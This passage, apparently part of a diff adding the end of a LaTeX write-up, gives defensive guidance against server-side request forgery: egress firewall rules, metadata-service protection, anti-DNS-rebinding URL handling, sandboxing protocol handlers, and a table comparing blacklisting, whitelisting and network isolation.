+The most effective defense is to ensure the web server physically cannot reach sensitive internal resources.
+\begin{itemize}
+    \item \textbf{Firewall Rules (Egress Filtering):} Configure the firewall to block the web server from making any outgoing connections to internal IP ranges (e.g., \texttt{10.0.0.0/8}, \texttt{192.168.0.0/16}).
+    \item \textbf{Cloud Metadata Protection:} Disable access to the metadata service (169.254.169.254) or require a custom header (like \texttt{X-aws-ec2-metadata-token}) that an attacker cannot easily inject via SSRF.
+\end{itemize}
+
+
+
+\subsection*{3. Proper URL Handling (Anti-Rebinding)}
+To prevent DNS Rebinding, the application should not resolve the same hostname twice.
+\begin{itemize}
+    \item \textbf{Resolve Once:} Resolve the hostname to an IP address at the start of the request.
+    \item \textbf{Validate the IP:} Check if that specific IP address is in a private/reserved range.
+    \item \textbf{Connect to IP:} Perform the HTTP request directly to that IP address, while manually setting the \texttt{Host} header to the original domain name to maintain compatibility with virtual hosting.
+\end{itemize}
+
+\subsection*{4. Disable Unnecessary Handlers}
+Many SSRF vulnerabilities are escalated by "Protocol Smuggling."
+\begin{itemize}
+    \item Use application libraries that only support the protocols you actually need. 
+    \item Ensure that secondary features like PDF generators or image processors are running in isolated "sandboxes" with no network access.
+\end{itemize}
+
+\subsection*{Summary Table: Security Maturity}
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Strategy} & \textbf{Security Level} & \textbf{Effectiveness} \\ \hline
+Blacklisting & Low & Easily bypassed (encoding/IP formats) \\ \hline
+Whitelisting & Medium & Good, but vulnerable to Open Redirects \\ \hline
+Network Isolation & High & Best; stops the request at the firewall \\ \hline
+\end{tabular}
+\end{center}
+
+
+
+\begin{quote}
+    \textbf{Final Thought:} SSRF is a architectural flaw. The goal of a developer should be to treat any user-supplied URL as inherently "poisoned" and never allow the server to act as a blind proxy for the internet.
+\end{quote}
+
+
+
+\end{document}
